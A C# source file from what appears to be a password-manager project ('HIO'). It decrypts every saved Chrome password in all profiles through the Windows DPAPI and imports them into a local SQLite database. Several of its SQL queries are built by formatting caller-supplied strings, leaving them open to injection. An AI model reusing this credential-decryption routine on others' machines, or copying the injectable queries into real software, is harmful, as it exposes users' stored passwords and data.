using System;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Data.SQLite;
using System.Data;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Windows.Forms;
using HIO.ViewModels.Settings;
using HIO.Setup;
using Newtonsoft.Json.Linq;
using System.Linq;

namespace HIO.Backend
{
    public class DPAPI
    {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
            bool CryptProtectData(ref DATA_BLOB pPlainText, string szDescription, ref DATA_BLOB pEntropy, IntPtr pReserved,
                                             ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pCipherText);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
            bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy,
                  IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        static private IntPtr NullPtr = ((IntPtr)((int)(0)));

        private const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;
        private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;

        private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
        {
            ps.cbSize = Marshal.SizeOf(
                                      typeof(CRYPTPROTECT_PROMPTSTRUCT));
            ps.dwPromptFlags = 0;
            ps.hwndApp = NullPtr;
            ps.szPrompt = null;
        }

        private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
        {
            // Use empty array for null parameter.
            if (data == null)
                data = new byte[0];

            // Allocate memory for the BLOB data.
            blob.pbData = Marshal.AllocHGlobal(data.Length);

            // Make sure that memory allocation was successful.
            if (blob.pbData == IntPtr.Zero)
                throw new Exception(
                    "Unable to allocate data buffer for BLOB structure.");

            // Specify number of bytes in the BLOB.
            blob.cbData = data.Length;

            // Copy data from original source to the BLOB structure.
            Marshal.Copy(data, 0, blob.pbData, data.Length);
        }

        public enum KeyType { UserKey = 1, MachineKey };







        public static string Decrypt(string cipherText)
        {
            string description;

            return Decrypt(cipherText, String.Empty, out description);
        }

        public static string Decrypt(string cipherText, out string description)
        {
            return Decrypt(cipherText, String.Empty, out description);
        }

        public static string Decrypt(string cipherText, string entropy, out string description)
        {
            // Make sure that parameters are valid.
            if (entropy == null) entropy = String.Empty;

            return Encoding.UTF8.GetString(
                        Decrypt(Convert.FromBase64String(cipherText),
                                    Encoding.UTF8.GetBytes(entropy),
                                out description));
        }

        public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
        {
            // Create BLOBs to hold data.
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB cipherTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();

            // We only need prompt structure because it is a required
            // parameter.
            CRYPTPROTECT_PROMPTSTRUCT prompt =
                                      new CRYPTPROTECT_PROMPTSTRUCT();
            InitPrompt(ref prompt);

            // Initialize description string.
            description = String.Empty;

            try
            {
                // Convert ciphertext bytes into a BLOB structure.
                try
                {
                    InitBLOB(cipherTextBytes, ref cipherTextBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize ciphertext BLOB.", ex);
                }

                // Convert entropy bytes into a BLOB structure.
                try
                {
                    InitBLOB(entropyBytes, ref entropyBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize entropy BLOB.", ex);
                }

                // Disable any types of UI. CryptUnprotectData does not
                // mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of
                // supported flags so we will not set it up.
                int flags = CRYPTPROTECT_UI_FORBIDDEN;

                // Call DPAPI to decrypt data.
                bool success = CryptUnprotectData(ref cipherTextBlob,
                                                  ref description,
                                                  ref entropyBlob,
                                                      IntPtr.Zero,
                                                  ref prompt,
                                                      flags,
                                                  ref plainTextBlob);

                // Check the result.
                if (!success)
                {
                    // If operation failed, retrieve last Win32 error.
                    int errCode = Marshal.GetLastWin32Error();

                    // Win32Exception will contain error message corresponding
                    // to the Windows error code.
                    throw new Exception(
                        "CryptUnprotectData failed.", new Win32Exception(errCode));
                }

                // Allocate memory to hold plaintext.
                byte[] plainTextBytes = new byte[plainTextBlob.cbData];

                // Copy ciphertext from the BLOB to a byte array.
                Marshal.Copy(plainTextBlob.pbData,
                             plainTextBytes,
                             0,
                             plainTextBlob.cbData);

                // Return the result.
                return plainTextBytes;
            }
            catch (Exception ex)
            {
                throw new Exception("DPAPI was unable to decrypt data.", ex);
            }
            // Free all memory allocated for BLOBs.
            finally
            {
                if (plainTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(plainTextBlob.pbData);

                if (cipherTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(cipherTextBlob.pbData);

                if (entropyBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(entropyBlob.pbData);
            }
        }
    }
    /// <summary>
    /// Login Packet
    /// </summary>
    public class LoginPack
    {
        public string url { get; set; }
        public string action { get; set; }
        public string userName { get; set; }
        public string password { get; set; }
        public byte isPassFlag { get; set; }
        public string title { get; set; }
        public string appID { get; set; }
        public string last_used { get; set; }
        public string rowid { get; set; }
    }

    internal class Chrome
    {
        public class Data
        {
            public string key { get; set; }
            public string value { get; set; }


        }
        public bool copyDataToIn()
        {


            try
            {
                // string filename = "my_chrome_passwords.html";
                //  StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
                string dbs = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
    + "\\Google\\Chrome\\User Data\\Default\\Login Data";
                //     string dbs = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
                //   + "\\Google\\Chrome\\User Data\\Default\\Login Data";
                string db_way = "HIOdb.sqlite";
                List<LoginPack> lp = new List<LoginPack>();
                string sql;
                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                DataTable DB = new DataTable();
                sql = string.Format("ATTACH '{0}' AS db2", dbs);

                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    connect.Open();
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    command.ExecuteNonQuery();
                    command = new SQLiteCommand("INSERT INTO 'main'.'logins' SELECT origin_url,action_url,username_value,password_value FROM db2.logins;", connect);
                    command.ExecuteNonQuery();


                    connect.Close();
                }

                return true;
            }
            catch (Exception ex)
            {
               
                return false;
            }


        }




        /// <summary>
        /// Fetching user passwords from browser
        /// </summary>
        /// <param name="bas">using for get handle hid device</param>
        /// <returns>List of users</returns>
        public List<LoginFieldS> getDataFromChrome()
        {
       
            
            List<LoginFieldS> userlist = new List<LoginFieldS>();
            try
            {
                
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var profiles = FindProfileName(path);
                foreach (var profile in profiles)
                {
                    
                    string db_way = path + "\\Google\\Chrome\\User Data\\" + profile + "\\Login Data";
                    string db_way2 = path + "\\Google\\Chrome\\User Data\\" + profile + "\\Login Data.hio";
                    File.Copy(db_way, db_way2, true);
                    string db_field = "logins";
                    string sql;
                    byte[] entropy = null;
                    string description;
                   

                    DataBase dbLocal = new DataBase();
                    string ConnectionString = "data source=" + db_way2 + ";New=True;UseUTF16Encoding=True";
                    DataTable DB = new DataTable();
                    sql = string.Format("SELECT  DISTINCT  * FROM {0}", db_field);
                    using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                    {

                        SQLiteCommand command = new SQLiteCommand(sql, connect);
                        SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                        adapter.Fill(DB);
                        int rows = DB.Rows.Count;

                        for (int i = 0; i < rows; i++)
                        {
                            Trace.WriteLine("DB.Rows.Count: " + rows);



                            byte[] byteArray = (byte[])DB.Rows[i][5];
                            byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                            if (((string)DB.Rows[i][7]).Split(':')[0] == "android")
                                continue;

                            string username = DB.Rows[i][3].ToString().GetUTF8String(64);
                            string password = (new UTF8Encoding(true).GetString(decrypted)).ToString().GetUTF8String(64);
                            string title = HIOStaticValues.getTitleNameURI(DB.Rows[i][7].ToString()).GetUTF8String(64);
                            string url = HIOStaticValues.getDomainNameURI(DB.Rows[i][7].ToString()).GetUTF8String(256);

                            if (password != "" && (string)DB.Rows[i][3] != "")
                                if (dbLocal.getInfoFromDB(url, username, "").Count == 0)
                                {
                                    userlist.Add(new LoginFieldS { password = new UTF8Encoding(true).GetString(decrypted), userName = (string)DB.Rows[i][3], title = title, url = url });



                                }

                        }


                        adapter.Dispose();
                        connect.Close();

                    }
                }
                return userlist;

            }
            catch (Exception ex)
            {

               
                throw ex;
            }

            

        }

        private List<string> FindProfileName(string pathChrome)
        {
            string text = File.ReadAllText(pathChrome + "\\Google\\Chrome\\User Data\\Local State");
            JObject json = JObject.Parse(text);
            json = JObject.Parse(json["profile"]["info_cache"].ToString());
            var profile = json.Properties().Select(p => p.Name).ToList();
            return profile ;
        }

        public LoginPack getDataFromID(string rowid)
        {

            try
            {
                string dbPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string db_way = dbPath + "/HIOdb.sqlite";
                string db_field = "logins";

                LoginPack lp = new LoginPack();
                string sql;
                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                DataTable DB = new DataTable();
                sql = string.Format("SELECT  DISTINCT  * FROM {0} WHERE rowid='{1}'", db_field, rowid);

                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(DB);

                    int rows = DB.Rows.Count;


                    //byte[] byteArray = (byte[])DB.Rows[i][3];
                    // byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                    lp = (new LoginPack { url = (DB.Rows[0][0] == DBNull.Value) ? string.Empty : DB.Rows[0][0].ToString(), userName = (DB.Rows[0][2] == DBNull.Value) ? string.Empty : (string)DB.Rows[0][2], password = (DB.Rows[0][3] == DBNull.Value) ? string.Empty : (string)DB.Rows[0][3], title = (DB.Rows[0][4] == DBNull.Value) ? string.Empty : (string)DB.Rows[0][4], appID = (DB.Rows[0][5] == DBNull.Value) ? string.Empty : DB.Rows[0][5].ToString(), last_used = (DB.Rows[0][6] == DBNull.Value) ? string.Empty : DB.Rows[0][6].ToString(), rowid = (DB.Rows[0][7] == DBNull.Value) ? string.Empty : DB.Rows[0][7].ToString() });

                    adapter.Dispose();
                    connect.Close();
                }
                // Writer.Close();

                return lp;
            }
            catch (Exception ex)
            {


                return null;
            }

        }
      

        public List<LoginFieldS> getInfoFromChrome(string colName, string username, string title, string action)
        {

            try
            {

                string dbPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string db_way = dbPath + "/HIOdb.sqlite";
                string db_field = "logins";
                List<LoginFieldS> lp = new List<LoginFieldS>();
                string sql;
                string colNameWithoutSlash = "";
                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                DataTable DB = new DataTable();
                if (colName.Substring(colName.Length - 1) == "/")
                    colNameWithoutSlash = colName.Substring(0, colName.Length - 1);
                else
                    colNameWithoutSlash = colName;
                if (title != "")
                {

                    sql = string.Format("SELECT DISTINCT * FROM {0} where (action_url=\"{1}\" or origin_url=\"{2}\" or origin_url=\"{3}/\") and username_value=\"{4}\" and title=\"{5}\" ", db_field, (action == "" || action == null) ? "{}" : action, colNameWithoutSlash, colNameWithoutSlash, username, title);
                }
                else if ((username == "" || username == null) && colName != "*")
                {

                    sql = string.Format("SELECT DISTINCT * FROM {0} where action_url=\"{1}\" or origin_url=\"{2}\" or origin_url=\"{3}/\" ", db_field, (action == "" || action == null) ? "{}" : action, colNameWithoutSlash, colNameWithoutSlash);
                }
                else if (colName == "*" && username != "")
                {
                    sql = string.Format("SELECT  DISTINCT * FROM {0} where username_value LIKE '{1}%' ", db_field, username.ToString());
                }
                else if (colName == "*")
                {
                    sql = string.Format("SELECT  DISTINCT * FROM {0} ", db_field);
                }

                else
                {
                    sql = string.Format("SELECT DISTINCT * FROM {0} where (action_url=\"{1}\" or origin_url=\"{2}\" or origin_url=\"{3}/\") and username_value=\"{4}\"", db_field, (action == "" || action == null) ? "{}" : action, colNameWithoutSlash, colNameWithoutSlash, username);
                }

                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(DB);
                    int rows = DB.Rows.Count;
                    for (int i = 0; i < rows; i++)
                    {

                        //byte[] byteArray = (byte[])DB.Rows[i][3];
                        // byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                        lp.Add(new LoginFieldS { url = (DB.Rows[i][0] == DBNull.Value) ? string.Empty : DB.Rows[i][0].ToString(), userName = (DB.Rows[i][2] == DBNull.Value) ? string.Empty : (string)DB.Rows[i][2], password = (DB.Rows[i][3] == DBNull.Value) ? string.Empty : (string)DB.Rows[i][3], title = (DB.Rows[i][4] == DBNull.Value) ? string.Empty : (string)DB.Rows[i][4], appID = (DB.Rows[i][5] == DBNull.Value) ? string.Empty : DB.Rows[i][5].ToString(), last_used = (DB.Rows[i][6] == DBNull.Value) ? string.Empty : DB.Rows[i][6].ToString(), rowid = (DB.Rows[i][7] == DBNull.Value) ? string.Empty : DB.Rows[i][7].ToString() });
                    }
                    adapter.Dispose();
                    connect.Close();
                }
                // Writer.Close();
                return lp;
            }
            catch (Exception ex)
            {


               
                return null;
            }

        }
        public int getLastId()
        {

            try
            {
                string dbPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string db_way = dbPath + "/HIOdb.sqlite";
                string db_field = "logins";
                List<LoginPack> lp = new List<LoginPack>();
                string sql;
                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                DataTable DB = new DataTable();


                sql = string.Format("SELECT MAX(rowid) FROM {0}", db_field);
                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(DB);
                    adapter.Dispose();
                    connect.Close();
                    return Int32.Parse(DB.Rows[0][0].ToString()) + 1;

                }
            }
            catch (Exception ex)
            {

              
                return -1;
            }
        }

    }
}
